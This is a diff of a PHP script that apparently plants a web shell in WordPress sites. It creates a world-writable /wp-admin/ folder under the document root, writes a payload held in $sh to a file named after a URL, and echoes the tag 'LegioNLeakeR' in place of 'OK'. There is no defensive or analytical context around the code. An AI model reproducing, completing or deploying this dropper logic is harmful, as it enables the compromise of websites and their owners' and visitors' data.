@@ -13,12 +13,12 @@ $test_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/';
 if (!file_exists($test_dir)) {
    
     if (mkdir($test_dir,0777)) {
-        echo "OK";
+        echo "LegioNLeakeR";
     } else {
         echo "Fail Create-Folder";
     }
 } else {
-    echo "OK";
+    echo "LegioNLeakeR";
 }
 // 
 $path = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url); 
@@ -27,11 +27,9 @@ $f = fopen($path, "w");
 if ($f === false) {
     @file_put_contents($path, $sh);
 } else {
-    $bytes_written = fwrite($f, $sh);
+    fwrite($f, $sh);
     fclose($f);
-    if ($bytes_written === false || $bytes_written < strlen($sh)) {
-        @file_put_contents($path, $sh);
-    }
+     
 }
 // 
 $path_u = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/up_' . file_name($url);
